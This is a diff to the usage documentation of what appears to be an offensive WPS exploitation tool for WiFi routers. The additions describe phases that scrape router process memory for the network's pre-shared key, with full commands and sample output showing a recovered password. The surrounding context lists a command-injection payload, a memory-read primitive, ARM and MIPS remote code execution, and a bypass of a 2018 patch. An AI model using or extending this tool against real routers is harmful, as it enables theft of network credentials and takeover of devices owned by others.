@@ -157,9 +157,55 @@ sudo python3 wpslinter.py \
     --cmd "id;#"
 ```
 
-#### 4. Memory Leak
+#### 4. Extract WiFi PSK (Quick)
 
-Read process memory:
+Extract PSK from a specific memory offset:
+
+```bash
+sudo python3 wpslinter.py \
+    --iface wlan0 \
+    --bssid AA:BB:CC:DD:EE:FF \
+    --ssid "MyNetwork" \
+    --phase extract_psk \
+    --psk_offset 0x2000 \
+    --psk_scan_size 8192
+```
+
+**Output example:**
+```
+============================================================
+WiFi PSK CANDIDATES FOUND:
+============================================================
+[1] MySuperSecretPassword123 <-- MOST LIKELY
+[2] wpa_passphrase
+[3] pre_shared_key
+============================================================
+
+SSID: MyNetwork
+Test with: wpa_passphrase <SSID> <PSK>
+============================================================
+```
+
+#### 5. Smart PSK Extraction
+
+Automatic multi-strategy PSK extraction:
+
+```bash
+sudo python3 wpslinter.py \
+    --iface wlan0 \
+    --bssid AA:BB:CC:DD:EE:FF \
+    --ssid "MyNetwork" \
+    --phase smart_psk
+```
+
+This will:
+1. Scan common memory regions (0x1000-0x5000)
+2. Perform stepped scan across first 64KB
+3. Display all unique PSK candidates found
+
+#### 6. Memory Leak
+
+Read raw process memory:
 
 ```bash
 sudo python3 wpslinter.py \
@@ -189,6 +235,8 @@ sudo python3 wpslinter.py \
 | `fingerprint` | Detect vulnerability | All |
 | `calibrate` | Measure FRAG-ACK timing | All |
 | `leak` | Memory read primitive | All |
+| **`extract_psk`** | **Extract WiFi PSK from memory** | **All** |
+| **`smart_psk`** | **Smart PSK extraction (multi-strategy)** | **All** |
 | `exploit_arm` | ARM RCE via send_data | ARM |
 | `exploit_mips` | MIPS RCE via GOT overwrite | MIPS |
 | `bypass` | Bypass 2018 patch | Patched |
